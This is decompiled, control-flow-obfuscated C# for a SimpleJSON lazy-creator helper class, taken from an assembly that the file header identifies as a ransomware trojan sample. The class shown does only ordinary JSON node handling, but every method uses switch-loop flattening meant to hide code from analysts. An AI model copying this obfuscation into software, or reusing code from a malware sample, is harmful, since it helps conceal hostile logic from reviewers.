// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONLazyCreator
// Assembly: StaticIndexRangePartitionForArr, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: AF5A1990-133C-4640-B616-63D01D46DEA5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-7c7116c6a0f1e06e4c252ea45668b85c1fdf3f35216097be1208e14be4066b36.exe

namespace SimpleJSON
{
  internal class JSONLazyCreator : JSONNode
  {
    private JSONNode m_Node = (JSONNode) null;
    private string m_Key = (string) null;

    public JSONLazyCreator(JSONNode aNode)
    {
      this.m_Node = aNode;
      this.m_Key = (string) null;
    }

    public JSONLazyCreator(JSONNode aNode, string aKey)
    {
label_1:
      int num1 = -1173239156;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -824146763)) % 4U)
        {
          case 0:
            this.m_Key = aKey;
            num1 = (int) num2 * 825172497 ^ -722437817;
            continue;
          case 1:
            this.m_Node = aNode;
            num1 = (int) num2 * -1972412292 ^ 1947358353;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    private void Set(JSONNode aVal)
    {
label_1:
      int num1 = 1893829395;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 310540508)) % 11U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * -1677135679 ^ -1426085007;
            continue;
          case 2:
            num1 = (int) num2 * 290450493 ^ -1477056716;
            continue;
          case 3:
            this.m_Node.Add(aVal);
            num1 = (int) num2 * -378461635 ^ -138423269;
            continue;
          case 4:
            num1 = (int) num2 * -1036599696 ^ -727359155;
            continue;
          case 5:
            this.m_Node = (JSONNode) null;
            num1 = 1865747004;
            continue;
          case 6:
            num1 = 872521695;
            continue;
          case 7:
            flag = this.m_Key == null;
            num1 = (int) num2 * 1835973138 ^ 1782571568;
            continue;
          case 8:
            this.m_Node.Add(this.m_Key, aVal);
            num1 = (int) num2 * 1858100698 ^ 1457053031;
            continue;
          case 9:
            int num3 = !flag ? 958537511 : (num3 = 1662847117);
            num1 = num3 ^ (int) num2 * -362692119;
            continue;
          case 10:
            goto label_1;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:;
    }

    public override JSONNode this[int aIndex]
    {
      get => (JSONNode) new JSONLazyCreator((JSONNode) this);
      set
      {
label_1:
        int num1 = -748818483;
        JSONArray aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -775347880)) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              aVal = new JSONArray();
              num1 = (int) num2 * -879941879 ^ 1074251738;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1378491338 ^ 1938423081;
              continue;
            case 3:
              aVal.Add(value);
              num1 = (int) num2 * -1861293777 ^ -1382434841;
              continue;
            case 4:
              goto label_1;
            case 5:
              num1 = (int) num2 * -824591004 ^ 1420499016;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public override JSONNode this[string aKey]
    {
      get
      {
label_1:
        int num1 = -2006399526;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -537360429)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this, aKey);
              num1 = (int) num2 * -2015075712 ^ 892269600;
              continue;
            case 3:
              num1 = (int) num2 * 1080282069 ^ -64413550;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return jsonNode;
      }
      set
      {
        JSONClass aVal = new JSONClass();
label_1:
        int num1 = -1272559238;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -860726639)) % 5U)
          {
            case 0:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -115836557 ^ -1529179741;
              continue;
            case 1:
              num1 = (int) num2 * 602216373 ^ -1736355463;
              continue;
            case 2:
              aVal.Add(aKey, value);
              num1 = (int) num2 * -242672136 ^ -1211407104;
              continue;
            case 3:
              goto label_3;
            case 4:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
    }

    public override void Add(JSONNode aItem)
    {
label_1:
      int num1 = 515248334;
      JSONArray aVal;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 584255335)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            aVal = new JSONArray();
            aVal.Add(aItem);
            num1 = (int) num2 * -1691374306 ^ 206115235;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      this.Set((JSONNode) aVal);
    }

    public override void Add(string aKey, JSONNode aItem)
    {
label_1:
      int num1 = 791650635;
      JSONClass aVal;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 558360666)) % 5U)
        {
          case 0:
            goto label_3;
          case 1:
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * -759647174 ^ 883939723;
            continue;
          case 2:
            goto label_1;
          case 3:
            aVal = new JSONClass();
            num1 = (int) num2 * -1340073011 ^ 52328113;
            continue;
          case 4:
            aVal.Add(aKey, aItem);
            num1 = (int) num2 * -362520428 ^ 840380686;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public static bool operator ==(JSONLazyCreator a, object b)
    {
label_1:
      int num1 = 640355869;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2100644458)) % 8U)
        {
          case 0:
            num1 = (int) num2 * -1998148039 ^ 308428287;
            continue;
          case 1:
            num1 = (int) num2 * -641323281 ^ -755393904;
            continue;
          case 2:
            flag2 = true;
            num1 = (int) num2 * 1740005074 ^ -1403379890;
            continue;
          case 3:
            int num3 = flag1 ? 533491974 : (num3 = 1656655458);
            num1 = num3 ^ (int) num2 * 1056932674;
            continue;
          case 4:
            goto label_1;
          case 6:
            flag2 = (object) a == b;
            num1 = 271759963;
            continue;
          case 7:
            flag1 = b == null;
            num1 = (int) num2 * -1476926348 ^ -1053266619;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return flag2;
    }

    public static bool operator !=(JSONLazyCreator a, object b)
    {
label_1:
      int num1 = 1179809781;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1990449188)) % 4U)
        {
          case 1:
            flag = !(a == b);
            num1 = (int) num2 * -496974389 ^ 1916131553;
            continue;
          case 2:
            num1 = (int) num2 * -976299880 ^ 1757654004;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return flag;
    }

    public override bool Equals(object obj)
    {
label_1:
      int num1 = -103169148;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1446143593)) % 7U)
        {
          case 0:
            goto label_1;
          case 2:
            flag1 = obj == null;
            num1 = (int) num2 * -787022867 ^ -285141890;
            continue;
          case 3:
            int num3 = !flag1 ? -1236860303 : (num3 = -719973212);
            num1 = num3 ^ (int) num2 * 997690378;
            continue;
          case 4:
            flag2 = true;
            num1 = (int) num2 * -689044048 ^ 985985226;
            continue;
          case 5:
            num1 = (int) num2 * 973872252 ^ 1865236022;
            continue;
          case 6:
            flag2 = (object) this == obj;
            num1 = -1823408006;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return flag2;
    }

    public override int GetHashCode()
    {
      int hashCode = base.GetHashCode();
label_1:
      int num1 = 65191304;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2020594856)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * -688984342 ^ -479183743;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return hashCode;
    }

    public override string ToString()
    {
      string str = "";
label_1:
      int num1 = 247996928;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1670361456)) % 3U)
        {
          case 1:
            num1 = (int) num2 * 1472304360 ^ -1296711285;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    public override string ToString(string aPrefix) => "";

    public override int AsInt
    {
      get
      {
label_1:
        int num1 = 690023443;
        JSONData aVal;
        int asInt;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1494622790)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              aVal = new JSONData(0);
              num1 = (int) num2 * 1612438721 ^ 980003428;
              continue;
            case 3:
              this.Set((JSONNode) aVal);
              asInt = 0;
              num1 = (int) num2 * 707652133 ^ 1040797703;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return asInt;
      }
      set
      {
label_1:
        int num1 = -227027477;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1775383798)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              this.Set((JSONNode) new JSONData(value));
              num1 = (int) num2 * -127302671 ^ -893481609;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public override float AsFloat
    {
      get
      {
label_1:
        int num1 = -504673137;
        float asFloat;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -64414995)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * 177955275 ^ -745020787;
              continue;
            case 2:
              this.Set((JSONNode) new JSONData(0.0f));
              asFloat = 0.0f;
              num1 = (int) num2 * -58760052 ^ 1213497208;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return asFloat;
      }
      set
      {
        JSONData aVal = new JSONData(value);
label_1:
        int num1 = 974737247;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 297730210)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1383935636 ^ -524204943;
              continue;
            case 2:
              goto label_3;
            case 3:
              num1 = (int) num2 * -530856863 ^ -457843637;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override double AsDouble
    {
      get
      {
label_1:
        int num1 = 772594696;
        double asDouble;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 661354334)) % 4U)
          {
            case 0:
              goto label_1;
            case 2:
              this.Set((JSONNode) new JSONData(0.0));
              num1 = (int) num2 * 1168002242 ^ -1124366791;
              continue;
            case 3:
              asDouble = 0.0;
              num1 = (int) num2 * -468213544 ^ 1003362119;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return asDouble;
      }
      set => this.Set((JSONNode) new JSONData(value));
    }

    public override bool AsBool
    {
      get
      {
        JSONData aVal = new JSONData(false);
label_1:
        int num1 = -750465063;
        bool asBool;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -2062836404)) % 4U)
          {
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 1666165863 ^ -1607804736;
              continue;
            case 2:
              goto label_1;
            case 3:
              asBool = false;
              num1 = (int) num2 * -297382952 ^ 528739088;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return asBool;
      }
      set => this.Set((JSONNode) new JSONData(value));
    }

    public override JSONArray AsArray
    {
      get
      {
        JSONArray aVal = new JSONArray();
label_1:
        int num1 = -938093943;
        JSONArray asArray;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -230349614)) % 6U)
          {
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1945022388 ^ 1213863098;
              continue;
            case 2:
              num1 = (int) num2 * 440538687 ^ -1929579699;
              continue;
            case 3:
              asArray = aVal;
              num1 = (int) num2 * -1409689738 ^ -713748267;
              continue;
            case 4:
              goto label_1;
            case 5:
              num1 = (int) num2 * -1932392786 ^ 1088194090;
              continue;
            default:
              goto label_7;
          }
        }
label_7:
        return asArray;
      }
    }

    public override JSONClass AsObject
    {
      get
      {
        JSONClass aVal = new JSONClass();
label_1:
        int num1 = 260420665;
        JSONClass asObject;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1053327860)) % 4U)
          {
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -222380623 ^ -767451357;
              continue;
            case 2:
              asObject = aVal;
              num1 = (int) num2 * 1417389571 ^ -777617606;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return asObject;
      }
    }
  }
}
